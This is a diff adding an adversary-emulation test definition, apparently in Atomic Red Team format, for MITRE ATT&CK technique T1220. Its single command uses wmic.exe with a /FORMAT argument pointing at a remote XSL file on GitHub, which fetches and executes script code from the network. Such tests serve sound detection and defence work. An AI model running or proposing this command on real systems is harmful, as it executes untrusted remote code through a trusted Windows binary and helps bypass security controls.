@@ -1,0 +1,15 @@
+attack_technique: T1220
+display_name: WMIC_loading_scripting_libraries
+
+atomic_tests:
+- name: execute remote xsl file using Wmic.exe 
+  auto_generated_guid: 07e26de2-344a-490b-b0ad-2677ae9465ff
+  description: |
+    This test load and execute a remote xsl file using wmic.exe
+  supported_platforms:
+    - windows
+    
+  executor:
+    name: powershell
+    elevation_required: true
+    command: wmic.exe os get /FORMAT:"https://raw.githubusercontent.com/Inovasys-CS/EDI/main/execution/WMIC_loading_scripting_libraries/src/script.xsl"
